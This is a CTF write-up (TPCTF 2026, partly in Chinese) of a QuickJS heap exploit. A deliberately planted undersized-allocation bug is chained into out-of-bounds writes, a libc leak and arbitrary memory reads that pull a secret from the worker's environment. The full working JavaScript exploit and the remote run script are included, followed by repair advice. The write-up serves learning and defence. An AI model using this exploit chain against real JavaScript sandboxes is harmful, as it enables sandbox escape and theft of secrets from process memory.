# quickjs-engine-core

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-513FF64F` · 状态 solved
```

## 一句话

A source-only JavaScript evaluation service runs on a pinned QuickJS engine core.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `src/quickjs-base-bundle.tar.gz` | 1.5 MB | `a69e0f7f77c5…` |
| `src/patch.diff` | 499 B | `3fd5518935e6…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 0. 结果

| 项 | 内容 |
| --- | --- |
| 目标 | 172.16.49.2:8000 |
| 类型 | QuickJS 引擎漏洞 / 堆利用 |
| 实例 Flag | «FLAG» |

一句话总结：题目补丁把长度小于 4096 的 ArrayBuffer backing store 强制压到 56 字节，但 JS 层仍看到原始 byte_length；利用相邻 JSArrayBuffer 结构体的越界写伪造超大 typed array，泄露 libc，读取 __environ，最终从 worker 的环境变量里取出 QJS_CTF_FLAG。

### 1. 题面与附件

服务是一个只跑源码的 QuickJS 求值服务：

• 每个 TCP 连接对应一个持久 runtime；
• 每行一个 JSON 请求 {"code":"<JavaScript source>"}，返回一行 JSON；
• host 去掉了文件系统、进程、模块和 native module API；
• worker 的环境只有 LC_ALL=C、LANG=C，以及可选的 QJS_CTF_FLAG。

附件与工作文件：

| 路径 | 说明 |
| --- | --- |
| jsbox3/ | 完整 QuickJS 2026-06-04 baseline、adapter、runner、构建清单 |
| p3_solve/patch3.diff | 题目补丁（499 字节） |
| p3_solve/p9.js | 实测 exploit |
| p3_solve/run_local.py | 本地 runner 驱动 |
| p3_solve/remote_run.txt | 远程运行记录 |
| p3_solve/local_evidence.txt | 本地 primitive、libc base、测试 flag 记录 |

需要特别注意：jsbox3/build-manifest.json 记录的是未打补丁的基线，"patched": false。题目补丁需要自己应用到 jsbox3/third_party/quickjs/src/quickjs.c。

### 2. 漏洞：56 字节的 backing store

p3_solve/patch3.diff 只改了 js_array_buffer_new 里的分配长度：

-            abuf->data = js_mallocz(ctx, max_int(len, 1));

```
+            size_t alloc_len = max_int(len, 1);
```

+            if (alloc_len < 4096)

```
+                alloc_len = 56;
+            abuf->data = js_mallocz(ctx, alloc_len);
```

对非 shared、byte_length < 4096 的 ArrayBuffer：

• abuf->byte_length 仍然等于 len；
• abuf->data 实际只分配 56 字节；
• new Uint8Array(ab) 的长度是 len，因此可以向前越界写最多 len - 56 字节。

new ArrayBuffer(4095) 是最合适的尺寸：JS 层有 4095 字节的可写窗口，底层只有 56 字节，越界范围约 4039 字节。

shared ArrayBuffer 走的是另一个分支（sab_alloc），不受这个补丁影响。

### 3. 堆布局与越界原语

QuickJS 的小块分配器按 8 字节对齐分 size class，sizeof(JSArrayBuffer) = 56，请求 56 字节时：

• align8(56) + 8 = 64；
• 64 字节落在 block size 为 64 的 class 中；
• abuf->data = js_mallocz(ctx, 56) 也落在同一个 64 字节 class。

js_array_buffer_new 的分配顺序是：

1. JSObject（72 字节 class）；
2. JSArrayBuffer 结构体（64 字节 class）；
3. abuf->data（64 字节 class）。

因此连续创建两个 ArrayBuffer 时，64 字节 class 的块顺序为：

ov.struct, ov.data, vic.struct, vic.data

ov.data 和 vic.struct 相邻。new Uint8Array(ov) 在两者之后创建，不会插到它们中间。

从 u = new Uint8Array(ov) 看的偏移：

| u 偏移 | 目标 |
| --- | --- |
| 56..63 | vic.struct 的 8 字节块头（block_idx/free_next、block_size_idx、gc_obj_type/mark、ref_count） |
| 64 | vic.byte_length（int） |
| 68 | vic.max_byte_length（int，原始值 -1） |
| 72 | vic.detached / vic.shared |
| 80 | vic.data 指针 |
| 112 | vic.free_func |

块头 56..63 必须保持合法，否则 allocator 在释放时会崩。越界写从 64 开始，正好跳过块头。

把 victim 的 byte_length 改成 0x7ffffff0：

```js
s32(64, 0x7ffffff0);
var w = new Uint32Array(vic);
```

new Uint32Array(vic) 的长度为：

(0x7ffffff0 - 0) >> 2 = 0x1fffffc = 536870908

于是得到一个从 vic.data 开始、向前约 2 GiB 的读写视图。

远程探测确认了相邻关系（p3_solve/remote_run.txt）：

```
{"ok":true,"result":"[256,-1,3,0,6,110]"}
```

u[64] = 256 是 victim 的原始 byte_length，u[68] = -1 是原始 max_byte_length，说明 ov.data 的溢出确实命中了 vic.struct。

### 4. 泄露 libc

目标是制造一个 unsorted bin chunk，让它的 fd/bk 指向 main_arena + 0x60。

**4.1 大字符串**

"A".repeat(0x2000) 会走 js_string_repeat → js_alloc_string：

• 请求 sizeof(JSString) + 8192 + 1 = 8209 字节；
• 超过 512 字节的小块上限，进入 js_malloc_large；
• js_malloc_large 用 glibc malloc(8 + size)，前 8 字节是 JSMallocLargeBlockHeader，返回 +8 作为 QJS user pointer。

随后分配 16 个 "G".repeat(0x1000) 作为 guard，防止 s1 释放时与 top chunk 合并；然后 s1 = null。JSString 的 refcount 归零后立即 js_free_rt，大块进入 glibc unsorted bin。

**4.2 扫描**

用 w 在 64 KiB 范围内找 0x41414141：

```js
var found = -1;
for (var i = 0; i < 0x4000; i++) {
if (w[i] === 0x41414141 && w[i-5] > 0x1000 && w[i-5] < 0x10000) {
found = i;
break;
}
}
```

实测（dword 索引，s = found）：

s-10: 0x2021        // chunk size（含 PREV_INUSE）

s-9 : prev_size

s-8/s-7: fd

s-6/s-5: bk（单 chunk unsorted bin 时 fd 与 bk 相同）

s-4..s-1: JSString 头/分配器元数据

s   : 'A' 字符...

泄漏指针取 s-6/s-5：

```js
var p = (w[found-6]>>>0) + (w[found-5]>>>0) * 4294967296;
var base = p - 0x203b20;
```

关键点：

• libc 指针的高 32 位不是 0x7fff....，而是 0x0000xxxx（例如 0x7ed0）；所以判断条件是 w[i-5] 落在 (0x1000, 0x10000)，不是判断 0x7f。
• 指针在 'A' 数据之前，不是之后；之前按 w[i+4] === 0x41414141 找会错位。
• 64 KiB 足够覆盖；不要扫 2 MiB。越过 brk 堆末尾会直接 SIGSEGV，worker 死亡。

本地验证（p3_solve/local_evidence.txt）：

computed base = 0x7ed070e00000

/proc/<pid>/maps libc base = 0x7ed070e00000

p - 0x203b20 与 maps 中的 libc base 完全一致。

**4.3 偏移**

目标镜像的 libc 是 Ubuntu 24.04 libc6 2.39-0ubuntu8.6：

| 符号 | 偏移 |
| --- | --- |
| main_arena | 0x203ac0 |
| unsorted bin 指针（main_arena + 0x60） | 0x203b20 |
| __environ | 0x20ad58 |

__environ 是 libc 的导出对象，readelf --dyn-syms 可直接看到 environ/_environ/__environ 都在 0x20ad58。

### 5. 任意地址读与 environ

拿到 libc base 后，改写 victim 结构体，把 data 指向任意地址：

```js
function setbuf(addr, len) {
```

s32(64, len);      // byte_length

s32(72, 0);        // detached = 0, shared = 0

s64(80, addr);     // data 指针

s32(112, 0);       // free_func = 0（低 4 字节）

s32(116, 0);       // free_func = 0（高 4 字节）

```js
return new Uint8Array(vic);
}
function rd64(addr) {
var b = setbuf(addr, 8);
return (b[0] | (b[1]<<8) | (b[2]<<16) | (b[3]<<24)) +
(b[4] | (b[5]<<8) | (b[6]<<16) | (b[7]<<24)) * 4294967296;
}
```

说明：

• max_byte_length（偏移 68）保持原始的 -1，所以 buffer 仍是不可 resize 的；
• free_func = 0 很重要：若之后 buffer 被 detach 或 GC，不会对伪造的 data 指针调用 free；
• 每次 setbuf 新建 Uint8Array，旧的 w 仍然指向同一块 victim data，不影响读取。

读取 __environ：

```js
var envp = rd64(base + 0x20ad58);
```

envp 是 char **，位于初始栈。遍历：

```js
for (var e = 0; e < 64; e++) {
var p = rd64(envp + e*8);
if (p === 0) break;
var b8 = setbuf(p, 8);
if (b8[0]===0x51 && b8[1]===0x4a && b8[2]===0x53 && b8[3]===0x5f &&
b8[4]===0x43 && b8[5]===0x54 && b8[6]===0x46 && b8[7]===0x5f) {
var bf = setbuf(p, 128);
// 读到 NUL
}
}
```

前缀 0x51 0x4a 0x53 0x5f 0x43 0x54 0x46 0x5f 就是 ASCII QJS_CTF_。找到后读 128 字节直到 NUL，得到：

```
QJS_CTF_FLAG=«FLAG»
```

本地用测试 flag 验证：

STATUS O

```
QJS_CTF_FLAG=«FLAG»
```

本地完整链耗时约 0.049s，远低于远程 2 秒的 eval 超时。

### 6. 复现

**6.1 本地构建**

工作副本：

rm -rf /mnt/d/work/p3

cp -a "/mnt/d/文档/deepseek-harness/TPCTF决赛/jsbox3/." /mnt/d/work/p3/

把 p3_solve/patch3.diff 的 hunk 应用到 /mnt/d/work/p3/third_party/quickjs/src/quickjs.c（diff 头是 a/quickjs.c，实际文件在 third_party/quickjs/src/）。然后：

```
cd /mnt/d/work/p3
```

make -j8 runner

生成 build/qjs_runner。

**6.2 精确 libc**

```bash
wget -O /tmp/libc6.deb \
```

https://launchpad.net/ubuntu/+archive/primary/+files/libc6_2.39-0ubuntu8.6_amd64.deb

dpkg-deb -x /tmp/libc6.deb /opt/lc23986

loader：

/opt/lc23986/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2

库目录：

/opt/lc23986/usr/lib/x86_64-linux-gnu

p3_solve/run_local.py 里已经写死这两个路径，以及：

```
env = {"LC_ALL":"C", "LANG":"C", "QJS_CTF_FLAG": flag}
```

**6.3 本地运行**

```bash
cd /mnt/d/work/p3
python3 run_local.py p9.js
```

输出：

STATUS O

```
QJS_CTF_FLAG=«FLAG»
```

**6.4 远程运行**

隧道建立后，服务在 172.16.49.2:8000。先做相邻性探测，再跑完整 exploit：

```python
cd "/mnt/d/文档/deepseek-harness/TPCTF决赛/js2"
python3 - <<'PY'
from qclient import Client
src = open("../p3_solve/p9.js").read()
c = Client("172.16.49.2", 8000, timeout=15)
try:
print(c.eval(src))
```

finally:

c.close()

PY

两次新连接的输出（p3_solve/remote_run.txt）：

```
{'ok': True, 'result': 'QJS_CTF_FLAG=«FLAG»'}
{'ok': True, 'result': 'QJS_CTF_FLAG=«FLAG»'}
```

### 7. 完整 exploit

以下为实测文件 p3_solve/p9.js：

```js
var ov=new ArrayBuffer(4095);var vic=new ArrayBuffer(256);var u=new Uint8Array(ov);
function g32(o){return (u[o]|(u[o+1]<<8)|(u[o+2]<<16)|(u[o+3]<<24))>>>0;}
function g64(o){return g32(o)+g32(o+4)*4294967296;}
function s32(o,v){u[o]=v&255;u[o+1]=(v>>>8)&255;u[o+2]=(v>>>16)&255;u[o+3]=(v>>>24)&255;}
function s64(o,v){var lo=v%4294967296;var hi=Math.floor(v/4294967296);s32(o,lo);s32(o+4,hi);}
s32(64,0x7ffffff0);
var w=new Uint32Array(vic);
var s1="A".repeat(0x2000);
var gs=[];for(var k=0;k<16;k++)gs.push("G".repeat(0x1000));
s1=null;
var found=-1;
for(var i=0;i<0x4000;i++){
if(w[i]===0x41414141 && w[i-5]>0x1000 && w[i-5]<0x10000){found=i;break;}
}
var OUT="noleak";
if(found>=0){
var bk=(w[found-6]>>>0)+(w[found-5]>>>0)*4294967296;
var base=bk-0x203b20;
function setbuf(addr,len){s32(64,len);s32(72,0);s64(80,addr);s32(112,0);s32(116,0);return new Uint8Array(vic);}
function rd64(addr){var b=setbuf(addr,8);var lo=(b[0]|(b[1]<<8)|(b[2]<<16)|(b[3]<<24))>>>0;var hi=(b[4]|(b[5]<<8)|(b[6]<<16)|(b[7]<<24))>>>0;return lo+hi*4294967296;}
var envp=rd64(base+0x20ad58);
OUT="base=0x"+base.toString(16)+" envp=0x"+envp.toString(16);
for(var e=0;e<64;e++){
var p=rd64(envp+e*8);
if(p===0)break;
var b8=setbuf(p,8);
if(b8[0]===0x51&&b8[1]===0x4a&&b8[2]===0x53&&b8[3]===0x5f&&b8[4]===0x43&&b8[5]===0x54&&b8[6]===0x46&&b8[7]===0x5f){
var bf=setbuf(p,128);var s="";
for(var j=0;j<128;j++){if(bf[j]===0)break;s+=String.fromCharCode(bf[j]);}
OUT=s;break;
}
}
}
```

OUT

执行顺序很重要：

1. 先 ov、vic，再 u；保证 ov.data 与 vic.struct 相邻；
2. 在 w 创建后再分配大字符串和 guard；
3. 先释放 s1，再扫描；
4. 泄露成功后不再使用 w，只用 setbuf 新建小 view。

### 8. 踩坑记录

**8.1 2 MiB 扫描会杀死 worker**

最初在 w 上扫 2 MiB 找 libc 指针，worker 直接 NOFRAME 退出。原因是越界视图虽然逻辑长度约 2 GiB，但堆的 brk 映射没有那么大，读到未映射页就 SIGSEGV。

修复：只扫 64 KiB，并在命中 0x41414141 后立即检查指针高 dword，命中即停。

**8.2 大 ArrayBuffer 的结构体不一定相邻**

曾尝试 new ArrayBuffer(0x8000) 后释放，利用它的 struct 做 leak。结果 big.struct 没有落在 ov.data 后面：64 字节 class 的空闲块用完后，QuickJS 会创建新的 arena，big.struct 进入新 arena，不再与 ov.data 相邻。

修复：改用大字符串的 glibc unsorted bin，不依赖 QJS arena 的连续性。

**8.3 gdb 里 loader 的参数**

直接：

```
gdb --args /opt/lc23986/.../ld-linux-x86-64.so.2 \
```

--library-path /opt/lc23986/... /mnt/d/work/p3/build/qjs_runner

再 run < in.bin，gdb 报：

/opt/lc23986/.../ld-linux-x86-64.so.2: missing program name

loader 没有收到 runner 路径。改用 core dump 分析：把 core_pattern 指到 /tmp/core.%p，ulimit -c unlimited，复现崩溃后 gdb qjs_runner /tmp/core.<pid>。

**8.4 libc 指针的高位**

一开始按 0x7f 判断 libc 指针，扫描一直不命中。实际上 64 位 libc 指针的高 32 位是 0x0000xxxx（例如 0x7ed0），低 32 位才是地址主体；正确的判断是 0x1000 < high < 0x10000。

### 9. 修复建议

**9.1 引擎侧**

js_array_buffer_new 不应把 alloc_len 压到小于逻辑长度：

```
size_t alloc_len = max_int(len, 1);
/* 删除 if (alloc_len < 4096) alloc_len = 56; */
abuf->data = js_mallocz(ctx, alloc_len);
```

如果确实想做小 buffer 优化，必须让 byte_length 与实际分配长度一致，或者在所有 typed array / DataView 访问路径上做边界检查，不能只改分配点。

**9.2 服务侧**

本题的 secret 直接放在 worker 的环境变量里，任何内存读原语都能拿到。runner 其实只需要知道“flag 是否存在”，不需要知道 flag 的值：

• 给 worker 设置一个非 secret 标记，例如 QJS_CTF_FLAG_PRESENT=1；
• 真实 flag 留在独立进程/文件描述符中，由 adapter 在需要时做校验；
• 如果必须把 secret 放进 worker，至少不要以明文环境变量形式常驻，并配合 seccomp、最小权限和内存隔离；
• 这类“源码求值”服务应把引擎内存破坏视为沙箱逃逸，不能只依赖去掉 std/os/process API。

### 10. 待核实事项

• 远程进程的精确 libc build ID 没有直接从 /proc 读取；本文的偏移来自 build-manifest.json 记录的 2.39-0ubuntu8.6，并由两次成功利用验证。若换实例，需重新确认 libc 版本与 __environ 偏移。
• exploit 依赖 QJS allocator 的确定性布局；每次用新连接、同一套分配顺序执行。两次新连接均成功，但不同连接池/不同构建仍需重新验证。
• flag 是实例相关的，本文的值只对 172.16.49.2:8000 这个实例有效。

## 结果

- flag sha256：`bff17b1a5f4ab3f538b3969357e3d89978082cfc96cf835f7ae4ba8f589f87fb`, `e4007344ef3d4ec728f59bc5c2c5a33289a8b2c7a461ee65e13a6e1da5246bfd`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/run_local.py`
- `solve/p9.js`

## 待核实

- 本条目由 WP 第 31 节《quickjs-engine-core》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
